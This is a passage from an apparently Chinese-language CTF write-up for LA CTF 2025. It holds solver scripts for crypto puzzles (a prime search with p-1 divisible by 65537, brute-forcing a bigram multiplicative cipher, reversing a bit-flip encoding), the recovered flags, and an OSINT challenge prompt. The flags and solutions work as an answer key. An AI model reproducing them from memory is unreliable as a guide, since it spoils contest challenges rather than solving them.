d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2114.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2614.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(3003.4,0)"><path data-c="25" d="M465 605Q428 605 394 614T340 632T319 641Q332 608 332 548Q332 458 293 403T202 347Q145 347 101 402T56 548Q56 637 101 693T202 750Q241 750 272 719Q359 642 464 642Q580 642 650 732Q662 748 668 749Q670 750 673 750Q682 750 688 743T693 726Q178 -47 170 -52Q166 -56 160 -56Q147 -56 142 -45Q137 -36 142 -27Q143 -24 363 304Q469 462 525 546T581 630Q528 605 465 605ZM207 385Q235 385 263 427T292 548Q292 617 267 664T200 712Q193 712 186 709T167 698T147 668T134 615Q132 595 132 548V527Q132 436 165 403Q183 385 203 385H207ZM500 146Q500 234 544 290T647 347Q699 347 737 292T776 146T737 0T646 -56Q590 -56 545 0T500 146ZM651 -18Q679 -18 707 24T736 146Q736 215 711 262T644 309Q637 309 630 306T611 295T591 265T578 212Q577 200 577 146V124Q577 -18 647 -18H651Z"></path></g><g data-mml-node="mn" transform="translate(3836.4,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(2000,0)"></path></g><g data-mml-node="mo" transform="translate(6614.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(7670,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="comment"># 寻找满足条件的64位素数</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">start = <span class="number">2</span>**<span class="number">63</span></span><br><span class="line">end = <span class="number">2</span>**<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p_candidate <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">    <span class="keyword">if</span> isPrime(p_candidate) <span class="keyword">and</span> (p_candidate - <span class="number">1</span>) % e == <span class="number">0</span>:</span><br><span class="line">        p = p_candidate</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">#9223372036859527241</span></span><br></pre></td></tr></table></figure>
<p>然后我们随便生成一个范围内的满足条件的素数q就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=<span class="number">9223372036854775837</span></span><br></pre></td></tr></table></figure>
<p>最后nc交互即可</p>
<p><img src="/images/2025LACTF/image-20250208154002164.png"></p>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{actually_though_whens_the_last_time_someone_checked_for_that}</span><br></pre></td></tr></table></figure>
<h3 id="bigram-times">bigram-times</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">characters = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~_"</span></span><br><span class="line">flag = <span class="string">"lactf{REDACTED~}"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bigram_multiplicative_shift</span>(<span class="params">bigram</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(bigram) == <span class="number">2</span>)</span><br><span class="line">    pos1 = characters.find(bigram[<span class="number">0</span>]) + <span class="number">1</span></span><br><span class="line">    pos2 = characters.find(bigram[<span class="number">1</span>]) + <span class="number">1</span></span><br><span class="line">    shift = (pos1 * pos2) % <span class="number">67</span></span><br><span class="line">    <span class="keyword">return</span> characters[((pos1 * shift) % <span class="number">67</span>) - <span class="number">1</span>] + characters[((pos2 * shift) % <span class="number">67</span>) - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">shifted_flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>):</span><br><span class="line">    bigram = flag[i:i+<span class="number">2</span>]</span><br><span class="line">    shifted_bigram = bigram_multiplicative_shift(bigram)</span><br><span class="line">    shifted_flag += shifted_bigram</span><br><span class="line"><span class="built_in">print</span>(shifted_flag)</span><br><span class="line"><span class="comment"># jlT84CKOAhxvdrPQWlWT6cEVD78z5QREBINSsU50FMhv662W</span></span><br><span class="line"><span class="comment"># Get solving!</span></span><br><span class="line"><span class="comment"># ...it's not injective you say? Ok fine, I'll give you a hint.</span></span><br><span class="line">not_the_flag = <span class="string">"mCtRNrPw_Ay9mytTR7ZpLJtrflqLS0BLpthi~2LgUY9cii7w"</span></span><br><span class="line">also_not_the_flag = <span class="string">"PKRcu0l}D823P2R8c~H9DMc{NmxDF{hD3cB~i1Db}kpR77iU"</span></span><br></pre></td></tr></table></figure>
<p>很明显是一个暴力穷举的题</p>
<p>首先我们试一下前几组对不对，拿jl试一下，发现得到了mC，PK和la，la是我们的答案中的一部分，其他两个就是我们的假flag中的前两个字母，这样就知道全部的思路了，我们只需要暴力逆向求解出全部的可能，然后使用假flag进行排除就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">characters = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~_"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_bigram</span>(<span class="params">c1, c2</span>):</span><br><span class="line">    possible = []</span><br><span class="line">    new_pos1 = characters.find(c1) + <span class="number">1</span></span><br><span class="line">    new_pos2 = characters.find(c2) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> pos1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">68</span>):</span><br><span class="line">        <span class="keyword">for</span> pos2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">68</span>):</span><br><span class="line">            shift = (pos1 * pos2) % <span class="number">67</span></span><br><span class="line">            <span class="keyword">if</span> (pos1 * shift) % <span class="number">67</span> == new_pos1 <span class="keyword">and</span> (pos2 * shift) % <span class="number">67</span> == new_pos2:</span><br><span class="line">                possible.append((characters[pos1-<span class="number">1</span>], characters[pos2-<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> possible</span><br><span class="line"></span><br><span class="line">target = <span class="string">"jlT84CKOAhxvdrPQWlWT6cEVD78z5QREBINSsU50FMhv662W"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对目标字符串中的每两个相邻字符组成的二元组进行解密</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(target), <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(target):</span><br><span class="line">        c1 = target[i]</span><br><span class="line">        c2 = target[i + <span class="number">1</span>]</span><br><span class="line">        results = decrypt_bigram(c1, c2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"密文二元组: (<span class="subst">{c1}</span>, <span class="subst">{c2}</span>)"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"可能的明文字符对:"</span>)</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">密文二元组: (j, l)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'l'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'m'</span>, <span class="string">'C'</span>)</span><br><span class="line">(<span class="string">'P'</span>, <span class="string">'K'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (T, <span class="number">8</span>)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'t'</span>)</span><br><span class="line">(<span class="string">'t'</span>, <span class="string">'R'</span>)</span><br><span class="line">(<span class="string">'R'</span>, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">4</span>, C)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'f'</span>, <span class="string">'{'</span>)</span><br><span class="line">(<span class="string">'u'</span>, <span class="string">'0'</span>)</span><br><span class="line">(<span class="string">'N'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (K, O)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'l'</span>, <span class="string">'}'</span>)</span><br><span class="line">(<span class="string">'m'</span>, <span class="string">'U'</span>)</span><br><span class="line">(<span class="string">'P'</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (A, h)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'D'</span>, <span class="string">'8'</span>)</span><br><span class="line">(<span class="string">'L'</span>, <span class="string">'T'</span>)</span><br><span class="line">(<span class="string">'_'</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (x, v)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'y'</span>, <span class="string">'9'</span>)</span><br><span class="line">(<span class="string">'1'</span>, <span class="string">'p'</span>)</span><br><span class="line">(<span class="string">'2'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (d, r)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'l'</span>, <span class="string">'1'</span>)</span><br><span class="line">(<span class="string">'m'</span>, <span class="string">'y'</span>)</span><br><span class="line">(<span class="string">'P'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (P, Q)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'A'</span>)</span><br><span class="line">(<span class="string">'t'</span>, <span class="string">'T'</span>)</span><br><span class="line">(<span class="string">'R'</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (W, l)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'~'</span>)</span><br><span class="line">(<span class="string">'t'</span>, <span class="string">'i'</span>)</span><br><span class="line">(<span class="string">'R'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (W, T)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'H'</span>, <span class="string">'9'</span>)</span><br><span class="line">(<span class="string">'V'</span>, <span class="string">'3'</span>)</span><br><span class="line">(<span class="string">'Z'</span>, <span class="string">'p'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">6</span>, c)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'D'</span>, <span class="string">'M'</span>)</span><br><span class="line">(<span class="string">'L'</span>, <span class="string">'J'</span>)</span><br><span class="line">(<span class="string">'_'</span>, <span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (E, V)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'{'</span>)</span><br><span class="line">(<span class="string">'t'</span>, <span class="string">'r'</span>)</span><br><span class="line">(<span class="string">'R'</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (D, <span class="number">7</span>)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'f'</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="string">'u'</span>, <span class="string">'P'</span>)</span><br><span class="line">(<span class="string">'N'</span>, <span class="string">'m'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">8</span>, z)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'q'</span>, <span class="string">'L'</span>)</span><br><span class="line">(<span class="string">'x'</span>, <span class="string">'D'</span>)</span><br><span class="line">(<span class="string">'z'</span>, <span class="string">'_'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">5</span>, Q)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'F'</span>, <span class="string">'{'</span>)</span><br><span class="line">(<span class="string">'S'</span>, <span class="string">'0'</span>)</span><br><span class="line">(<span class="string">'4'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (R, E)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'h'</span>, <span class="string">'D'</span>)</span><br><span class="line">(<span class="string">'B'</span>, <span class="string">'L'</span>)</span><br><span class="line">(<span class="string">'E'</span>, <span class="string">'_'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (B, I)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'p'</span>, <span class="string">'t'</span>)</span><br><span class="line">(<span class="string">'3'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'9'</span>, <span class="string">'R'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (N, S)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'h'</span>, <span class="string">'i'</span>)</span><br><span class="line">(<span class="string">'B'</span>, <span class="string">'~'</span>)</span><br><span class="line">(<span class="string">'E'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (s, U)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'i'</span>, <span class="string">'1'</span>)</span><br><span class="line">(<span class="string">'7'</span>, <span class="string">'y'</span>)</span><br><span class="line">(<span class="string">'~'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">5</span>, <span class="number">0</span>)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'D'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'L'</span>, <span class="string">'g'</span>)</span><br><span class="line">(<span class="string">'_'</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (F, M)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'w'</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="string">'U'</span>, <span class="string">'Y'</span>)</span><br><span class="line">(<span class="string">'}'</span>, <span class="string">'k'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (h, v)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'p'</span>, <span class="string">'R'</span>)</span><br><span class="line">(<span class="string">'3'</span>, <span class="string">'t'</span>)</span><br><span class="line">(<span class="string">'9'</span>, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'i'</span>, <span class="string">'i'</span>)</span><br><span class="line">(<span class="string">'7'</span>, <span class="string">'7'</span>)</span><br><span class="line">(<span class="string">'~'</span>, <span class="string">'~'</span>)</span><br><span class="line"></span><br><span class="line">密文二元组: (<span class="number">2</span>, W)</span><br><span class="line">可能的明文字符对:</span><br><span class="line">(<span class="string">'i'</span>, <span class="string">'U'</span>)</span><br><span class="line">(<span class="string">'7'</span>, <span class="string">'w'</span>)</span><br><span class="line">(<span class="string">'~'</span>, <span class="string">'}'</span>)</span><br></pre></td></tr></table></figure>
<p>然后把错误的flag部分全部去除就可以了</p>
<p>最后的flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{mULT1pl1cAtiV3_6R0uPz_4rE_9RE77y_5we3t~~~}</span><br></pre></td></tr></table></figure>
<h2 id="misc">Misc</h2>
<h3 id="extended">Extended</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">"lactf{REDACTED}"</span></span><br><span class="line">extended_flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line">    o = <span class="built_in">bin</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Replace the first 0 with a 1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> o[i] == <span class="string">"0"</span>:</span><br><span class="line">            o = o[:i] + <span class="string">"1"</span> + o[i + <span class="number">1</span> :]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    extended_flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(o, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(extended_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"chall.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extended_flag.encode(<span class="string">"iso8859-1"</span>))</span><br></pre></td></tr></table></figure>
<p>简单的逆向一下就可以了</p>
<p>py脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取chall.txt文件内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./chall.txt"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    extended_flag = f.read().decode(<span class="string">"iso8859-1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化还原后的字符串</span></span><br><span class="line">original_flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历extended_flag中的每个字符</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> extended_flag:</span><br><span class="line">    <span class="comment"># 将字符转换为ASCII码，再转换为8位二进制字符串</span></span><br><span class="line">    o = <span class="built_in">bin</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找到二进制字符串中第一个1，并将其替换为0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> o[i] == <span class="string">"1"</span>:</span><br><span class="line">            o = o[:i] + <span class="string">"0"</span> + o[i + <span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将处理后的二进制字符串转换回整数，再转换为字符，添加到original_flag中</span></span><br><span class="line">    original_flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(o, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出还原后的字符串</span></span><br><span class="line"><span class="built_in">print</span>(original_flag)</span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<p><img src="/images/2025LACTF/image-20250208154731353.png"></p>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{Funnily_Enough_This_Looks_Different_On_Mac_And_Windows}</span><br></pre></td></tr></table></figure>
<h3 id="danger-searching">Danger Searching</h3>
<blockquote>
<p>My friend told me that they hiked on a trail that had 4 warning signs
at the trailhead: Hazardous cliff, falling rocks, flash flood, AND
strong currents! Could you tell me where they went? They did hint that
these signs were posted on a public hawaiian hiking trail.</p>
<p>Note: the intended location has all 4 signs in the same spot. It is 4
distinct signs - not 4 warnings on one sign.</p>
<p>Flag is the full 10 digit <a target="_blank" rel="noopener" href="https://plus.codes/map">plus
code</a> <strong>containing the signs they are mentioning</strong>,
(e.g. lactf{85633HC3+9X} would be the flag for Bruin Bear Statue at
UCLA). The plus code is in the URL when you select a location, or click
the <code>^</code> at the bottom of the screen next to the short plus
code to get the full length one.</p>
